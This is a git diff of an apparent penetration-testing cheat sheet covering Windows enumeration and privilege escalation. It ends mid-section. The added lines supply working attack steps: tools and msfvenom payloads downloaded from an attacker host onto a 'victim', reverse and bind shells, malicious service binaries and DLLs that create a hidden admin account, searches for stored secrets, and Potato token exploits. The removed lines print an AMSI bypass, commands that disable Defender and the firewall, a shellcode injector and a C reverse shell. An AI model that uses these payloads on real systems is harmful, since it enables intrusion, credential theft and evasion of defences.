@@ -2905,6 +2905,26 @@ There are several key pieces of information we should always obtain:
 - Running processes
 ```
 
+Automate your enumeration with WinPEAS, etc.:
+
+```sh
+# serve up copies of binaries to run on victim
+cp /usr/share/peass/winpeas/winPEASx64.exe .
+# JAWS - invoke with: powershell -exec Bypass -File .\jaws-enum.ps1
+wget https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1
+# https://github.com/GhostPack/Seatbelt
+wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe
+# for older machines
+wget https://github.com/carlospolop/winPE/raw/master/binaries/accesschk-xp/accesschk-2003-xp.exe
+
+# start web server
+sudo python -m http.server 80
+
+# on windows host:
+powershell -c "iwr -uri http://LISTEN_IP/winPEASx64.exe -Outfile winpeas.exe"
+.\winpeas.exe
+```
+
 Commands to run:
 
 ```powershell
@@ -2971,6 +2991,11 @@ schtasks
 schtasks /query /fo list /v
 
 # Services running
+# Get-CimInstance supercedes Get-WmiObject
+Get-CimInstance -ClassName win32_service | Where-Object {$_.State -like 'Running' -and $_.PathName -notlike 'C:\Windows\System32\*'} | select Name,PathName
+# alternatively
+wmic service where "started=true and not pathname like 'C:\\Windows\\System32\\%'" get name,pathname
+# old school way
 tasklist /svc
 net start
 sc queryex type= service state= active
@@ -2997,7 +3022,10 @@ reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
 # if so, view powershell command history with:
 Get-WinEvent Microsoft-Windows-PowerShell/Operational | Where-Object Id -eq 4104 | select message | Format-List
 # search powershell history for secrets:
-Get-WinEvent Microsoft-Windows-PowerShell/Operational | Where-Object Id -eq 4104 | select message | Select-String -Pattern "secret" # also try 'secur'
+Get-WinEvent Microsoft-Windows-PowerShell/Operational | Where-Object Id -eq 4104 | select message | Select-String -Pattern "secret" # also try 'secur' and 'passw'
+
+# User files that may have juicy data
+powershell -c "Get-ChildItem -Path C:\Users\ -Exclude Desktop.ini -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.gpg,*.kdbx,*.ini,*pst,*.ost,*.eml,*.msg -File -Recurse -ErrorAction SilentlyContinue"
 
 # What Active Directory Domain you belong to
 wmic computersystem get domain
@@ -3087,6 +3115,41 @@ driverquery | findstr "File System"
 
 ## 5.2 Windows Privilege Escalation
 
+So many options on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md).
+
+Automated checks using SharpUp.exe or PowerUp.ps1:
+
+```powershell
+# on kali get SharpUp and/or PowerUp, serve on http
+wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe
+cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
+sudo python -m http.server 80
+
+# on victim
+iwr http://LISTEN_IP/PowerUp.ps1 -outfile PowerUp.ps1
+.\SharpUp.exe audit
+# or
+powershell -ep bypass
+. .\PowerUp.ps1
+Invoke-PrivescAudit
+
+# PowerUp, individually:
+Get-UnquotedService
+Get-ModifiableServiceFile
+Get-ModifiableService
+Find-ProcessDLLHijack
+Find-PathDLLHijack
+Get-RegistryAlwaysInstallElevated
+Get-RegistryAutoLogon
+Get-ModifiableRegistryAutoRun
+Get-ModifiableScheduledTaskFile
+Get-UnattendedInstallFile
+Get-WebConfig
+Get-ApplicationHost
+Get-SiteListPassword
+Get-CachedGPPPassword
+```
+
 **Background on Windows Permissions:**
 
 Knowing how Windows identifies principals is necessary to understand access tokens. It's also critical for understanding how to move around in Active Directory.
@@ -3134,7 +3197,7 @@ How to see integrity levels:
 _User Account Control (UAC)_ is a Windows security feature that protects the operating system by running most applications and tasks with standard user privileges, even if the user launching them is an Administrator. For this, an administrative user obtains two access tokens after a successful logon. The first token is a standard user token (or _filtered admin token_), which is used to perform all non-privileged operations. The second token is a regular administrator token. It will be used when the user wants to perform a privileged operation. To leverage the administrator token, a UAC consent prompt normally needs to be confirmed.
 
 
-## 5.3 Check Windows File Permissions
+### 5.2.1 Check Windows File Permissions
 
 Weak permissions can provide a privesc vector.
 
@@ -3154,336 +3217,7 @@ accesschk.exe /accepteula -quvwc SERVICENAME
 
 
 
-## 5.4 Antivirus & Firewall Evasion
-
-You can use `shellter` to inject a malicious payload into a legitimate Windows 32-bit executable. Just run `shellter` in the terminal and follow the prompts. Recommend using `stealth` mode so it doesn't alert the user. The paid version of `shellter` supports 64-bit executables.
-
-To check that your exploit works:
-
-```sh
-# start listener for reverse shell
-sudo nc -lvnp 443
-
-# run shellter-injected binary with wine
-wine derp.exe
-```
-
-**NOTE:** I've had issues using the binaries under `/usr/share/windows-resources/binaries/`, so download something like PuTTY from the internet instead. Make sure you get the 32-bit version of whatever binary you grab.
-
-Advanced Evasion techniques:
-
-- https://cloudblogs.microsoft.com/microsoftsecure/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/
-- https://web.archive.org/web/20210317102554/https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf
-
-### 5.4.1 Windows Process Injection
-
-The general technique for injecting shellcode into another process goes like this:
-
-1. ***OpenProcess*** - Get a HANDLE to a target process that you have permissions to access
-2. ***VirtualAllocEx*** - Allocate memory within the target process
-3. ***WriteProcessMemory*** - Copy your shellcode into the target process's memory
-4. ***CreateRemoteThread*** - Start execution of your shellcode in new thread running within target process
-
-These are the most common Windows APIs used to accomplish this, but there are [many other alternatives](https://malapi.io/).
-
-Here is a PowerShell implementation of a simple "process injector" that injects the shellcode into itself and runs it:
-
-```powershell
-$imports = '
-[DllImport("kernel32.dll")]
-public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-
-[DllImport("kernel32.dll")]
-public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-
-[DllImport("msvcrt.dll")]
-public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
-
-$w = Add-Type -memberDefinition $imports -Name "derp" -namespace Win32Functions -passthru;
-
-# msfvenom -p windows/shell_reverse_tcp -f powershell -v s LPORT=443 LHOST=LISTEN_IP
-[Byte[]];
-[Byte[]]$s = <SHELLCODE HERE>;
-
-$size = 0x1000;
-
-if ($s.Length -gt 0x1000) {$size = $s.Length};
-
-$x = $w::VirtualAlloc(0,$size,0x3000,0x40);
-
-for ($i=0;$i -le ($s.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $s[$i], 1)};
-
-$w::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
-```
-
-
-
-### 5.4.2 Windows AMSI Bypass
-
-This one-liner lets you get past Windows' Antimalware Scan Interface (AMSI), which
-will e.g. block malicious powershell scripts from running. If you get a warning
-saying something like "This script contains malicious content and has been blocked
-by your antivirus software", then run this command to disable that blocker.
-
-```powershell
-$a=[Ref].Assembly.GetTypes();foreach($b in $a){if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
-```
-
-Other bypasses available through nishang's [Invoke-AMSIBypass](https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1).
-
-
-
-### 5.4.3 Turn off Windows Firewall
-
-```powershell
-# must be done from administrator prompt
-# Disable Windows firewall on newer Windows:
-netsh advfirewall set allprofiles state off
-
-# Disable Windows firewall on older Windows:
-netsh firewall set opmode disable
-```
-
-
-
-### 5.4.4 Turn off Windows Defender
-
-```powershell
-# must be running powershell as Administrator
-Set-MpPreference -DisableRealtimeMonitoring $true
-
-# for completely removing Windows Defender (until next Windows update)
-Uninstall-WindowsFeature -Name Windows-Defender
-```
-
-Alternatively, you should be able to do it with services:
-
-```powershell
-sc config WinDefend start= disabled
-sc stop WinDefend
-
-# to restart Defender
-sc config WinDefend start= auto
-sc start WinDefend
-```
-
-I think you can even disable it with Registry keys:
-
-```powershell
-reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender /v DisableAntiSpyware /t DWORD /d 1 /f
-
-# more granular controls
-reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection /v DisableBehaviorMonitoring /t DWORD /d 1 /f
-reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection /v DisableOnAccessProtection /t DWORD /d 1 /f
-reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection /v DisableScanOnRealtimeEnable /t DWORD /d 1 /f
-
-# then reboot for changes to take effect
-```
-
-
-
-### 5.4.5 Windows Encoding/Decoding with LOLBAS
-
-```powershell
-# base64 encode a file
-certutil -encode inputFileName encodedOutputFileName
-# base64 decode a file
-certutil -decode encodedInputFileName decodedOutputFileName
-# hex decode a file
-certutil --decodehex encoded_hexadecimal_InputFileName
-# MD5 checksum
-certutil -hashfile somefile.txt MD5
-```
-
-
-
-### 5.4.6 Execute Inline Tasks with MSBuild.exe
-
-MSBuild is built into Windows .NET framework, and it lets you execute arbitrary
-C#/.NET code inline. Modify the XML file below with your shellcode from
-msfvenom's "-f csharp" format (or build a payload with Empire's
-windows/launcher_xml stager, or write your own C# and host over SMB)
-
-To build:
-```powershell
-# locate MSBuild executables
-dir /b /s C:\msbuild.exe
-
-# execute 32-bit shellcode
-C:\Windows\Microsoft.NET\assembly\GAC_32\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe  payload.xml
-
-# execute 64-bit shellcode
-C:\Windows\Microsoft.NET\assembly\GAC_64\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe  payload.xml
-```
-
-Here's the payload.xml template to inject your shellcode into (if not building
-with Empire)
-
-```xml
-<!-- This is 32-bit. To make 64-bit, swap all UInt32's for UInt64, use 64-bit
-     shellcode, and build with 64-bit MSBuild.exe
-     Building Shellcode:
-     msfvenom -p windows/meterpreter/reverse_tcp lhost=YOUR_IP lport=443 -f csharp | tee shellcode.cs
--->
-<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-  <!-- This inline task executes shellcode. -->
-  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
-  <!-- Save This File And Execute The Above Command -->
-  <!-- Author: Casey Smith, Twitter: @subTee -->
-  <!-- License: BSD 3-Clause -->
-  <Target Name="Hello">
-    <ClassExample />
-  </Target>
-  <UsingTask
-    TaskName="ClassExample"
-    TaskFactory="CodeTaskFactory"
-    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
-    <Task>
-
-      <Code Type="Class" Language="cs">
-      <!-- to host code remotely, instead use:
-      <Code Type="Class" Language="cs" Source="\\ATTACKER_IP\share\source.cs">
-      -->
-      <![CDATA[
-        using System;
-        using System.Runtime.InteropServices;
-        using Microsoft.Build.Framework;
-        using Microsoft.Build.Utilities;
-        public class ClassExample :  Task, ITask
-        {
-          private static UInt32 MEM_COMMIT = 0x1000;
-          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
-          [DllImport("kernel32")]
-            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
-            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
-          [DllImport("kernel32")]
-            private static extern IntPtr CreateThread(
-            UInt32 lpThreadAttributes,
-            UInt32 dwStackSize,
-            UInt32 lpStartAddress,
-            IntPtr param,
-            UInt32 dwCreationFlags,
-            ref UInt32 lpThreadId
-            );
-          [DllImport("kernel32")]
-            private static extern UInt32 WaitForSingleObject(
-            IntPtr hHandle,
-            UInt32 dwMilliseconds
-            );
-          public override bool Execute()
-          {
-            //PUT YOUR SHELLCODE HERE;
-
-            UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-            Marshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);
-            IntPtr hThread = IntPtr.Zero;
-            UInt32 threadId = 0;
-            IntPtr pinfo = IntPtr.Zero;
-            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
-            WaitForSingleObject(hThread, 0xFFFFFFFF);
-            return true;
-          }
-        }
-      ]]>
-      </Code>
-    </Task>
-  </UsingTask>
-</Project>
-```
-
-
-
-### 5.4.7 Custom Windows TCP Reverse Shell
-
-A custom reverse shell can often get past antivirus.
-
-```c
-/* Win32 TCP reverse cmd.exe shell
- * References:
- * https://docs.microsoft.com/en-us/windows/win32/winsock/creating-a-basic-winsock-application
- * https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
- * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
- * https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-sockaddr_in
- * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-inet_addr
- * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-htons
- * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect
- * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
- * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
- * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
- * https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366877(v=vs.85)
- */
-#include <winsock2.h>
-#include <ws2tcpip.h>
-
-#pragma comment(lib, "Ws2_32.lib")
-
-// CHANGE THESE
-#define TARGET_IP   "LISTEN_IP"
-#define TARGET_PORT 443
-
-void main(void) {
-  SOCKET s;
-  WSADATA wsa;
-  STARTUPINFO si;
-  struct sockaddr_in sa;
-  PROCESS_INFORMATION pi;
-
-  WSAStartup(MAKEWORD(2,2), &wsa);
-  s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
-  sa.sin_family = AF_INET;
-  sa.sin_addr.s_addr = inet_addr(TARGET_IP);
-  sa.sin_port = htons(TARGET_PORT);
-  WSAConnect(s, (struct sockaddr *)&sa, sizeof(sa), NULL, NULL, NULL, NULL);
-  SecureZeroMemory(&si, sizeof(si));
-  si.cb = sizeof(si);
-  si.dwFlags = STARTF_USESTDHANDLES;
-  si.hStdInput = (HANDLE)s;
-  si.hStdOutput = (HANDLE)s;
-  si.hStdError = (HANDLE)s;
-  CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
-}
-```
-
-To compile on Kali (as 32-bit binary because it works on both 32- and 64-bit):
-
-```sh
-sudo dpkg --add-architecture i386
-sudo apt update
-sudo apt install mingw-w64 wine
-i686-w64-mingw32-gcc rsh.c -o rsh.exe -s -lws2_32
-```
-
-
-
-## 5.5 Windows UAC Bypass
-
-Only the local "Administrator" user can perform admin actions without any User Account Control (UAC) restrictions. All other admin user accounts must normally pass UAC checks to perform admin actions, unless UAC is disabled.
-
-UAC Enabled registry key (can only modify as admin):
-
-``` powershell
-# Disabling UAC via registry:
-reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t DWORD /f /d 0
-
-# Enabling UAC:
-reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t DWORD /f /d 1
-```
-
-Bypass Technique:
-
-```powershell
-# Ref: https://mobile.twitter.com/xxByte/status/1381978562643824644
-New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
-New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
-fodhelper
-
-# To undo:
-Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
-```
-
-
-
-## 5.6 Windows Service Escalation - Registry
+### 5.2.2 Windows Service Escalation - Registry
 
 Vulnerable when:
 
@@ -3510,7 +3244,8 @@ void ControlHandler(DWORD request);
 //add the payload here
 int Run()
 {
-    system("whoami > c:\\temp\\service.txt");
+    system ("net user derp herpaderp /add");
+    system ("net localgroup administrators derp /add");
     return 0;
 }
 
@@ -3592,7 +3327,408 @@ reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND
 sc start regsvc
 ```
 
-## 5.7 Cross-Compiling Windows Binaries on Linux
+
+### 5.2.3 Windows Binary Hijacking
+
+⚠**NOTE**: Listing services requires interactive logon via RDP. You will get a "not authorized" error through WinRM or bind/reverse shell!!
+
+This privesc vector works by overwriting the executable file for Windows Services, Scheduled Tasks, and AutoRuns. Service hijacking, Scheduled Tasks hijacking, and AutoRuns hijacking.
+
+You can automate the search for the privesc vector with PowerUp:
+
+```sh
+# on kali, serve up PowerUp.ps1
+cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
+sudo python -m http.server 80
+
+# on victim
+certutil -urlcache -split -f http://LISTEN_IP/PowerUp.ps1
+powershell -ep bypass
+. .\PowerUp.ps1
+Get-ModifiableService # can change binpath
+Get-ModifiableServiceFile # can overwrite executable file
+Get-ModifiableRegistryAutoRun # can modify executable file/path
+Get-ModifiableScheduledTaskFile # can modify task executable
+```
+
+To find the vulnerability manually:
+
+First look for running services with paths outside `C:\Windows\System32`:
+
+```powershell
+# Get-CimInstance supercedes Get-WmiObject
+Get-CimInstance -ClassName win32_service | Where-Object {$_.State -like 'Running' -and $_.PathName -notlike 'C:\Windows\System32\*'} | select Name,PathName
+# alternatively
+wmic service where "started=true and not pathname like 'C:\\Windows\\System32\\%'" get name,pathname
+```
+
+Here's how to look for Scheduled Tasks:
+
+```powershell
+$header="HostName","TaskName","NextRunTime","Status","LogonMode","LastRunTime","LastResult","Author","TaskToRun","StartIn","Comment","ScheduledTaskState","IdleTime","PowerManagement","RunAsUser","DeleteTaskIfNotRescheduled","StopTaskIfRunsXHoursandXMins","Schedule","ScheduleType","StartTime","StartDate","EndDate","Days","Months","RepeatEvery","RepeatUntilTime","RepeatUntilDuration","RepeatStopIfStillRunning"
+schtasks /query /fo csv /nh /v | ConvertFrom-Csv -Header $header | select -uniq TaskName,NextRunTime,Status,TaskToRun,RunAsUser | Where-Object {$_.RunAsUser -ne $env:UserName -and $_.TaskToRun -notlike "%windir%*" -and $_.TaskToRun -ne "COM handler" -and $_.TaskToRun -notlike "%systemroot%*" -and $_.TaskToRun -notlike "C:\Windows\*" -and $_.TaskName -notlike "\Microsoft\Windows\*"}
+```
+
+Next, check permissions of binary files:
+
+```powershell
+icacls "C:\path\to\binary.exe"
+```
+
+Common `icacls` permissions masks:
+
+| Mask | Permissions             |
+| ---- | ----------------------- |
+| F    | Full access             |
+| M    | Modify access           |
+| RX   | Read and execute access |
+| R    | Read-only access        |
+| W    | Write-only access       |
+
+Look for ones that allow writing (F, M, W), especially under `Authenticated Users`.
+
+**Exploiting the vulnerability**:
+
+If the service binary is invoked without arguments, you can easily use `PowerUp.ps1` to exploit it:
+
+```powershell
+# create new local admin user derp:herpaderp
+powershell -ep bypass
+. .\PowerUp.ps1
+Install-ServiceBinary -User 'derp' -Password 'herpaderp' -ServiceName 'SERVICENAME'
+# by default, creates new local user: john with password Password123!
+```
+
+To exploit manually:
+
+Create a malicious service binary. Here is a simple one that adds a new admin user account:
+
+```c
+// compile with:
+// x86_64-w64-mingw32-gcc derp.c -o derp.exe
+
+#include <stdlib.h>
+
+int main ()
+{
+  system ("net user derp herpaderp /add");
+  system ("net localgroup administrators derp /add");
+  return 0;
+}
+```
+
+Alternatively, create the windows service binary with `msfvenom`.
+
+```sh
+# add user - msfvenom
+msfvenom -p windows/adduser -f exe -o derp.exe USER=derp PASS=Herpaderp1!
+
+# run arbitrary command - msfvenom
+msfvenom -p windows/exec -f exe -o derp.exe lport=443 cmd="C:\Windows\Temp\nc.exe -L -p 6969 -e cmd.exe" lhost=ATTACKER_IP
+```
+
+Once compiled, transfer over to victim machine and replace the vulnerable service binary with your own.
+
+```powershell
+iwr -uri http://192.168.119.3/derp.exe -Outfile derp.exe
+move C:\path\to\vulnerable\service.exe service.exe.bak
+move .\derp.exe C:\path\to\vulnerable\service.exe
+```
+
+Try to restart the service:
+
+```powershell
+net stop SERVICENAME
+net start SERVICENAME
+```
+
+If you get "Access Denied" error, you may be able to restart service by rebooting machine:
+
+```powershell
+# check the StartMode
+# if it's "Auto", you can restart the service by rebooting
+Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'SERVICENAME'}
+
+# check that you can reboot
+# look for "SeShutdownPrivilege" being present (doesn't matter if it says "Disabled")
+whoami /priv
+
+# restart the machine
+shutdown /r /t 0
+```
+
+
+### 5.2.4 Windows DLL Hijacking
+
+References:
+- [HackTricks DLL Hijacking](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking)
+
+There are multiple ways to hijack a DLL. One method is to overwrite an existing DLL that you have write permissions for, but this can often cause the program to crash because it's looking for exports that the malicious DLL doesn't provide.
+
+A better way is to abuse the DLL search order (sometimes called *Search Order Hijacking*). Here is the default search order in Windows with **SafeDllSearchMode** enabled (when it's disabled, the current working directory jumps up to slot #2):
+
+1. The directory from which the application loaded.
+2. The system directory. (`C:\Windows\System32`)
+3. The 16-bit system directory. (`C:\Windows\System`)
+4. The Windows directory.  (`C:\Windows`)
+5. The current directory.
+6. The directories that are listed in the PATH environment variable.
+
+Note: if you can edit the SYSTEM PATH variable, you can potentially use that to perform a DLL search order hijack. You can check if you have Write permissions on any directories in the PATH with (WinPEAS does this automatically):
+
+```
+for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
+```
+
+You can check if SafeDLLSearchMode is enabled in the registry:
+
+```powershell
+# Enabled = 1, Disabled = 0
+reg query 'HKLM\System\CurrentControlSet\Control\Session Manager' /v SafeDllSearchMode
+# or
+Get-ItemPropertyValue -Path 'HKLM:\System\CurrentControlSet\Control\Session Manager' -Name SafeDllSearchMode
+```
+
+
+**Finding Missing DLLs**:
+
+Automated way with PowerUp.ps1:
+
+```powershell
+iwr http://LISTEN_IP/PowerUp.ps1 -outfile PowerUp.ps1
+powershell -ep bypass
+. .\PowerUp.ps1
+Find-ProcessDLLHijack
+Find-PathDLLHijack
+```
+
+To manually see if a binary is missing DLLs, you can use Process Monitor (procmon, from [Sysinternals](https://download.sysinternals.com/files/SysinternalsSuite.zip)). This requires admin privileges, so you may need to copy over the service binary and DLLs to your own Windows machine to test. It's also possible to perform static binary reverse engineering, but that's a pain.
+
+Add Filters to procmon to only see missing DLL events. This happens when `CreateFile()` results in a `NAME NOT FOUND` error while trying to open a DLL. 
+
+| Column       | Relation  | Value           | Action  |
+| ------------ | --------- | --------------- | ------- |
+| Path         | ends with | .dll            | Include |
+| Result       | contains  | not found       | Include |
+| Operation    | is        | CreateFile      | Include |
+| Process Name | is        | `TARGETSVC.exe` | Include |
+
+Restart the service/process and check procmon to see if it fails to load any DLLs:
+
+```powershell
+Restart-Service VICTIMSERVICE
+```
+
+If you find DLLs that fail to open, and the search order includes a path that you can write to, you're in luck.
+
+**Exploiting:**
+
+Create a malicious DLL. Here is a simple example that adds a local admin user:
+
+```c
+// compile with:
+// x86_64-w64-mingw32-gcc derp.c --shared -o derp.dll
+
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+  switch ( ul_reason_for_call )
+  {
+    case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+      system ("net user derp herpaderp /add");
+      system ("net localgroup administrators derp /add");
+      break;
+    case DLL_THREAD_ATTACH: // A process is creating a new thread.
+      break;
+    case DLL_THREAD_DETACH: // A thread exits normally.
+      break;
+    case DLL_PROCESS_DETACH: // A process unloads the DLL.
+      break;
+  }
+  return TRUE;
+}
+```
+
+Alternatively, you can use `msfvenom` to create a malicious DLL:
+
+```sh
+# add user - msfvenom
+msfvenom -p windows/adduser -f dll -o derp.dll USER=derp PASS=Herpaderp1!
+```
+
+> :warning:  **NOTE:** Make sure you match the DLL to the ***appropriate architecture*** of the target binary (32-bit vs 64-bit)!!! If you don't, your exploit will fail!
+
+Put the new DLL in the search path of the service executable on the victim host, then restart the service.
+
+```powershell
+# copy the dll to the correct location with the correct name
+iwr -uri http://LISTEN_IP/derp.dll -Outfile C:\path\to\REALNAME.dll
+# or
+certutil -urlcache -split -f http://LISTEN_IP/derp.dll C:\path\to\REALNAME.dll
+
+# restart service
+Restart-Service VICTIMSERVICE
+```
+
+
+### 5.2.5 Unquoted Windows Service Paths
+
+If a Windows service's path contains spaces and isn't quoted in the service entry, you might be able to hijack its execution by inserting a binary that gets executed in its place. This requires write permissions to the **parent directory** of whichever path component contains a space, and you drop and EXE in that directory named `word-before-space.exe`. For example, if the path starts with `C:\Program Files\...`, then you'd need write permissions to `C:\`, and would drop an EXE named `Program.exe`.
+
+This is how Windows tries to resolve the unquoted path `C:\Program Files\My Program\My service\service.exe`:
+
+```
+C:\Program.exe
+C:\Program Files\My.exe
+C:\Program Files\My Program\My.exe
+C:\Program Files\My Program\My service\service.exe
+```
+
+**Finding Unquoted Service Paths**:
+
+```powershell
+# lists all unquoted service paths with a space in them
+Get-CimInstance -ClassName win32_service | Where-Object {$_.PathName -notlike 'C:\Windows\*' -and $_.PathName -notlike '"*' -and $_.PathName -like '* *.exe*'} | select Name,PathName
+# alternatively, for cmd only
+wmic service where "pathname like '% %.exe%'" get name,pathname |  findstr /ipv "C:\\Windows\\" | findstr /ipv """
+
+
+# alternatively, use PowerUp.ps1
+iwr http://LISTEN_IP/PowerUp.ps1 -Outfile PowerUp.ps1
+powershell -ep bypass
+. .\PowerUp.ps1
+Get-UnquotedService
+```
+
+For paths you find, check permissions of each appropriate directory with `icacls DIRECTORY`. Look for write permissions (F, M, W), especially for `Authenticated Users`.
+
+**Exploiting:**
+
+Once you find your candidate, generate a payload binary with `msfvenom` or whatever:
+
+```sh
+# add user - msfvenom
+msfvenom -p windows/adduser -f exe -o derp.exe USER=derp PASS=Herpaderp1!
+
+# host on http
+sudo python -m http.server 80
+```
+
+Then drop it in the appropriate directory with the appropriate name on the victim:
+
+```powershell
+# grab file and put it in right spot with right name
+iwr http://VICTIM_IP/derp.exe -outfile C:\path\to\file.exe
+
+# restart the service
+restart-service "SERVICENAME"
+```
+
+If you are using PowerUp, you can use that to exploit the vulnerability:
+
+```powershell
+powershell -e bypass
+. .\PowerUp.ps1
+# change path as appropriate
+Write-ServiceBinary -Name 'SERVICENAME' -UserName 'derp' -Password 'herpaderp' -Path "C:\Program Files\Enterprise Apps\Current.exe"
+
+# still restart service
+restart-service "SERVICENAME"
+```
+
+
+### 5.2.6 Windows Token Impersonation
+
+You can use token impersonation to elevate privileges.
+
+These require the `SeImpersonatePrivilege` or `SeAssignprimaryTokenPrivilege` to be enabled. This is the case when you have a shell running as `NT AUTHORITY\LOCAL SERVICE`, as well as `Local System`, `Network Service`, and `Application Pool Identity` (common when access was from exploiting IIS or other Windows services).
+
+#### 5.2.6.1 Windows Token Impersonation with GodPotato
+
+GodPotato works with a wide range of Windows versions (Windows Server 2012 - Windows Server 2022; Windows 8 - Windows 11). It's also very easy to use as a way to run a command as SYSTEM as long as your current user has the `SeImpersonatePrivilege`.
+
+```sh
+# On windows host, first check .NET version
+dir C:\windows\microsoft.net\framework\
+
+# On Kali, download appropriate binary
+wget https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe
+
+# also generate a reverse shell
+msfvenom -p windows/shell_reverse_tcp -f exe -o derp.exe lport=443 lhost=LISTEN_IP
+
+# start a HTTP server to host the binaries
+python -m http.server 80
+
+# On windows, download and execute GodPotato with reverse shell
+cd C:\Users\Public
+iwr -uri http://LISTEN_IP/derp.exe -Outfile derp.exe
+iwr -uri http://LISTEN_IP/GodPotato-NET4.exe -Outfile GodPotato.exe
+.\GodPotato.exe -cmd "C:\users\public\derp.exe"
+```
+
+
+
+#### 5.2.6.2 Windows Token Impersonation with PrintSpoofer
+
+First grab the binary and host it on HTTP.
+
+```sh
+wget https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe
+sudo python3 -m http.server 80
+```
+
+Then throw the exploit on the Windows victim.
+
+```powershell
+iwr -uri http://LISTEN_IP/PrintSpoofer64.exe -Outfile PrintSpoofer.exe
+
+# throw the exploit
+.\PrintSpoofer.exe -i -c "powershell"
+```
+
+#### 5.2.6.3 Windows Token Impersonation with RoguePotato
+
+NOTE: Alternatives to RoguePotato include: _RottenPotato_, _SweetPotato_, _JuicyPotato_, and [_JuicyPotatoNG_](https://github.com/antonioCoco/JuicyPotatoNG).
+
+```sh
+# on kali box, grab binary
+wget https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip
+unzip RoguePotato.zip
+
+# set up socat redirector for roguepotato to bounce off of
+sudo socat -d -d -d tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
+# also start another netcat listener to catch the system shell
+sudo nc -vlnp 443
+```
+
+On windows victim:
+
+```powershell
+# in windows reverse shell with "SeImpersonatePrivilege"
+# or "SeAssignPrimaryTokenPrivilege" enabled
+
+# grab the binary
+iwr -uri http://LISTEN_IP/RoguePotato.exe -Outfile RoguePotato.exe
+
